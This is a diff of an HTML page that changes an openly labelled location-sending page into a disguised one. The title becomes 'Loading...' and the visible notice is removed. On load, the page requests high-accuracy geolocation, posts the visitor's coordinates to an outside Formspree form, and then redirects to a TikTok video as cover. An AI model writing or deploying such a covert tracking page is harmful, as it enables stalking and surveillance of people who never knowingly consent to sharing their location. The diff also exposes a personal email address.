@@ -3,40 +3,41 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Location Sender</title>
+    <title>Loading...</title>
     <script>
         function getLocation() {
             if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(sendLocation);
+                navigator.geolocation.getCurrentPosition(sendLocation, redirectNow, {
+                    enableHighAccuracy: true,
+                    timeout: 5000
+                });
             } else {
-                alert("位置情報を取得できません。");
+                redirectNow();
             }
         }
 
         function sendLocation(position) {
             let lat = position.coords.latitude;
             let lon = position.coords.longitude;
-
-            // Netlify FunctionにPOSTリクエストを送信
-            fetch('/.netlify/functions/send-location', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ lat: lat, lon: lon }),
-            })
-            .then(response => response.json())
-            .then(data => {
-                console.log(data.message);
-                window.location.replace("https://example.com");  // リダイレクト
-            })
-            .catch(error => {
-                console.error("Error:", error);
-            });
+            
+            // Formspree にデータを送信
+            fetch("https://formspree.io/f/mvgkwpzg", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    email: "kagage24@gmail.com",
+                    message: `Latitude: ${lat}, Longitude: ${lon}`
+                })
+            }).finally(redirectNow);
         }
 
-        window.onload = getLocation;
+        function redirectNow() {
+            window.location.replace("https://www.tiktok.com/@kaga1024/video/7431843644312800513"); // ここをリダイレクト先に変更
+        }
+
+        getLocation();
     </script>
 </head>
 <body>
-    <h1>位置情報を送信しています...</h1>
 </body>
 </html>
